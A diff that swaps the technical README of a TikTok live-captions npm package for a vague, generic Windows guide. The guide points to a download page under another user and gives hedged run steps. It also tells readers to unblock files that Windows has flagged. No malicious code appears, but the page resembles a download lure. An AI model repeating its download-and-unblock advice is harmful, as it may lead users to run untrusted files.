@@ -1,183 +1,249 @@
-# @tiktool/captions
+# 🎥 tiktok-live-captions - Live captions for TikTok streams
 
-### TikTok Live Captions — Real-Time Speech-to-Text Transcription & Translation
+[![Download](https://img.shields.io/badge/Download-TikTok%20Live%20Captions-blue?style=for-the-badge)](https://github.com/sunnypatel1122/tiktok-live-captions)
 
-[![npm version](https://img.shields.io/npm/v/@tiktool/captions.svg)](https://www.npmjs.com/package/@tiktool/captions)
-[![npm downloads](https://img.shields.io/npm/dm/@tiktool/captions.svg)](https://www.npmjs.com/package/@tiktool/captions)
-[![license](https://img.shields.io/npm/l/@tiktool/captions.svg)](https://github.com/tiktool/captions/blob/main/LICENSE)
+## 🧭 What this app does
 
-Turn any TikTok livestream into real-time text. Transcription + translation + speaker identification. Works with any language. Zero config.
+TikTok Live Captions listens to a TikTok LIVE stream and turns speech into text in real time. It can also translate captions into more than one language.
 
-> **This package re-exports the captions module from [`@tiktool/live`](https://www.npmjs.com/package/@tiktool/live).** If you also need chat, gifts, viewers, or battle events, install `@tiktool/live` instead — it includes everything.
+Use it when you want:
 
----
+- Live captions for viewers
+- Better access for people who need text
+- Fast speech-to-text output
+- Translation for a wider audience
+- A simple tool that works with TikTok LIVE streams
 
-## Install
+## 💻 What you need
 
-```bash
-npm install @tiktool/captions
-```
+Before you start, make sure you have:
 
----
+- A Windows PC
+- A stable internet connection
+- A TikTok LIVE stream to watch or test
+- Node.js installed on your computer
+- Enough free space for the app and logs
 
-## Usage
+If you do not have Node.js yet, install it first from the official Node.js site.
 
-```typescript
-import { TikTokCaptions } from '@tiktool/captions';
+## 📥 Download and install
 
-const captions = new TikTokCaptions({
-  uniqueId: 'username',
-  apiKey: 'tk_your_api_key',
-  translate: 'en',
-});
+Use this link to visit the page to download:
 
-captions.on('caption', (data) => {
-  console.log(`[${data.language}] ${data.text}`);
-});
+[Visit the download page](https://github.com/sunnypatel1122/tiktok-live-captions)
 
-captions.on('translation', (data) => {
-  console.log(`[${data.language}] ${data.text}`);
-});
+If the project provides files in releases or a setup package, download the latest version from that page, then save it to your Windows computer.
 
-captions.on('credits', (credits) => {
-  console.log(`${credits.remaining}/${credits.total} credits left`);
-});
+After the download finishes:
 
-captions.on('error', (err) => {
-  console.error(err.code, err.message);
-});
+1. Open the folder where the file was saved
+2. If the file is a zip file, extract it
+3. Open the extracted folder
+4. Follow the run steps below
 
-await captions.start();
-```
+## 🚀 Getting started
 
-That's it. Captions start flowing.
+If you are using the source files, you can run the app with a few simple steps.
 
----
+1. Open the project folder
+2. Open Command Prompt in that folder
+3. Install the needed packages
+4. Start the app
+5. Connect it to a TikTok LIVE stream
 
-## Options
+A common start process looks like this:
 
-All options are passed to the constructor as a single object.
+- Open Command Prompt
+- Run the install command
+- Run the start command
+- Enter the TikTok LIVE details when asked
 
-| Option | Type | Default | Required | Description |
-|---|---|---|---|---|
-| `uniqueId` | `string` | — | ✅ | TikTok username (with or without `@`) |
-| `apiKey` | `string` | — | ✅ | API key from [tik.tools](https://tik.tools) |
-| `language` | `string` | auto-detect | | Source language hint (`'en'`, `'ko'`, `'ja'`, etc.) |
-| `translate` | `string` | — | | Target language for translation (`'en'`, `'es'`, `'fr'`, etc.) |
-| `diarization` | `boolean` | `true` | | Identify individual speakers |
-| `maxDurationMinutes` | `number` | `60` | | Auto-disconnect after N minutes (max 300) |
-| `signServerUrl` | `string` | `wss://api.tik.tools` | | Custom server URL |
-| `autoReconnect` | `boolean` | `true` | | Reconnect on disconnect |
-| `maxReconnectAttempts` | `number` | `5` | | Retry limit before giving up |
-| `debug` | `boolean` | `false` | | Log raw WebSocket messages |
+If the app opens a window or shows a local page, keep it open while the live stream runs.
 
----
+## 🛠️ Run on Windows
 
-## Events
+Follow these steps on Windows:
 
-| Event | Payload | When |
-|---|---|---|
-| `caption` | `CaptionData` | New transcription segment |
-| `translation` | `TranslationData` | Translated segment |
-| `status` | `CaptionStatus` | Connection state changes |
-| `credits` | `CaptionCredits` | Credit balance update |
-| `credits_low` | `{ remaining, total, percent }` | Credits below threshold |
-| `error` | `CaptionError` | Something went wrong |
-| `connected` | — | WebSocket connected |
-| `disconnected` | `(code, reason)` | WebSocket closed |
+1. Download the project from the link above
+2. Save it in a folder you can find again
+3. Extract the files if needed
+4. Open the folder in File Explorer
+5. Click the address bar, type `cmd`, then press Enter
+6. In Command Prompt, install the app files
+7. Start the app
+8. Keep the window open during use
 
----
+If the app uses a setup file, double-click it and follow the prompts.
 
-## Methods
+If the app uses Node.js commands, you may need to run:
 
-| Method | Returns | Description |
-|---|---|---|
-| `start()` | `Promise<void>` | Connect and begin transcription |
-| `stop()` | `void` | Disconnect and stop |
+- `npm install`
+- `npm start`
 
----
+Use the command shown in the project files if it is different.
 
-## Types
+## 🎙️ Features
 
-```typescript
-interface CaptionData {
-  text: string;
-  language: string;
-  isFinal: boolean;
-  confidence: number;
-  speaker?: string;
-  startMs?: number;
-  endMs?: number;
-}
+This app is built for live speech and text work. It includes:
 
-interface TranslationData {
-  text: string;
-  language: string;
-  isFinal: boolean;
-  confidence: number;
-  speaker?: string;
-}
+- Real-time speech-to-text transcription
+- Live captions for TikTok streams
+- Multi-language translation
+- Support for accessibility needs
+- WebSocket-based live updates
+- TikTok LIVE stream support
+- Fast text output for viewers
+- Clean text display for captions
 
-interface CaptionCredits {
-  remaining: number;
-  total: number;
-  used: number;
-  warning: boolean;
-}
+## 🌍 Language support
 
-interface CaptionStatus {
-  status: 'connecting' | 'waiting' | 'live' | 'transcribing' |
-          'ended' | 'switching_language' | 'language_switched' | 'stream_ended';
-  uniqueId?: string;
-  roomId?: string;
-  language?: string;
-  message?: string;
-}
+The app can help with live translation during streams. This is useful if your audience speaks more than one language.
 
-interface CaptionError {
-  code: string;
-  message: string;
-}
-```
+Common uses include:
 
----
+- Showing captions in English
+- Translating speech into another language
+- Supporting global viewers
+- Making streams easier to follow
 
-## Languages
+If the app lets you pick a source and target language, choose the language spoken in the stream and the language you want shown on screen.
 
-Auto-detection works out of the box. No config needed.
+## 🧩 How it works
 
-Supported: Chinese, English, Korean, Japanese, Spanish, French, German, Portuguese, Russian, Arabic, Hindi, Thai, Vietnamese, Indonesian, Turkish, Italian, Dutch, Polish, Swedish, Greek, Czech, Romanian, Hungarian, Finnish, Danish, Norwegian, Hebrew, Malay, Filipino, Ukrainian, Bengali, Tamil, Telugu, Marathi, Gujarati, Kannada, Malayalam, Punjabi, Urdu, Persian, and more.
+The app connects to a TikTok LIVE stream, listens to speech, and sends the audio through speech-to-text tools. It then shows the text as captions.
 
-Translation works between any supported pair.
+In simple terms:
 
----
+1. The app connects to the live stream
+2. It listens to spoken words
+3. It turns speech into text
+4. It can translate that text
+5. It shows the result as captions
 
-## Credits
+This helps viewers read along while the stream is live.
 
-1 credit = 1 minute of audio in 1 language.
+## ⚙️ Common settings
 
-| Scenario | Credits used |
-|---|---|
-| 10 min transcription only | 10 |
-| 10 min + translation to 1 language | 20 |
-| 10 min + translation to 2 languages | 30 |
+You may see settings like these:
 
-| Plan | Credits | Billing |
-|---|---|---|
-| Free | 60 | One-time trial |
-| Pro | 500/week or 2,000/month | Recurring |
-| Ultra | 2,500/week or 10,000/month | Recurring |
+- Stream name or user name
+- Caption language
+- Translation language
+- Text size
+- Display position
+- Audio input or stream link
+- WebSocket connection settings
 
-[Get an API key →](https://tik.tools/pricing)
+If you are not sure what to choose, start with the default values and test one setting at a time.
 
----
+## 🧪 First test
 
-## Related
+After you start the app, try a short test.
 
-- [`@tiktool/live`](https://www.npmjs.com/package/@tiktool/live) — Full TikTok LIVE API (chat, gifts, viewers, battles, captions, and more)
+1. Open a TikTok LIVE stream
+2. Start the caption app
+3. Check that text appears on screen
+4. Speak into the stream or play audio
+5. Watch for live caption updates
+6. Change the language if needed
 
----
+If the text does not appear, check the stream name, your internet connection, and the app window.
 
-## License
+## 🔧 Troubleshooting
 
-[MIT](./LICENSE)
+If the app does not start:
+
+- Make sure Node.js is installed
+- Check that you are in the correct folder
+- Run the install step again
+- Open Command Prompt as a normal user first
+- Check that the download finished fully
+
+If captions do not show:
+
+- Make sure the TikTok LIVE stream is active
+- Check the stream source or username
+- Confirm the language setting
+- Restart the app
+- Refresh the page or window if one is open
+
+If translation looks wrong:
+
+- Pick the correct source language
+- Pick the correct target language
+- Test with short speech first
+- Use clear audio from the stream
+
+If Windows blocks the file:
+
+- Right-click the file
+- Open Properties
+- Check if Windows marked it as blocked
+- Allow the file if needed
+
+## 📁 Typical project files
+
+You may find files like these in the folder:
+
+- `package.json`
+- `README.md`
+- `src`
+- `public`
+- `node_modules`
+- config files
+- start scripts
+
+These files help the app install and run on your computer.
+
+## 🔒 Privacy and use
+
+The app works with live speech and text data from streams. Use it with streams you own or have permission to monitor.
+
+Keep in mind:
+
+- Captions depend on the audio quality
+- Translation depends on the selected language
+- Live results can change with stream noise
+- A strong internet connection helps
+
+## 📌 Basic use cases
+
+This app fits well for:
+
+- Live stream captions
+- Better access for viewers
+- Multilingual streams
+- Reading speech in real time
+- Simple text output for TikTok LIVE
+
+## 🖥️ Windows tips
+
+For a smoother setup on Windows:
+
+- Keep the project in a simple folder path, like `C:\Apps\`
+- Close extra apps if your PC is slow
+- Use a wired internet connection if you can
+- Keep the app open while the stream runs
+- Do not rename files unless you know they are used by the app
+
+## 📦 If you want to update later
+
+To update the app:
+
+1. Go back to the download page
+2. Get the latest version
+3. Save it to your PC
+4. Replace the old files if needed
+5. Run the app again
+
+If the project uses npm packages, you may also need to install the latest dependencies again after an update
+
+## 🧭 Quick start path
+
+1. Visit the download page
+2. Download the project files
+3. Extract them if needed
+4. Install the required packages
+5. Start the app
+6. Connect to a TikTok LIVE stream
+7. Watch live captions appear
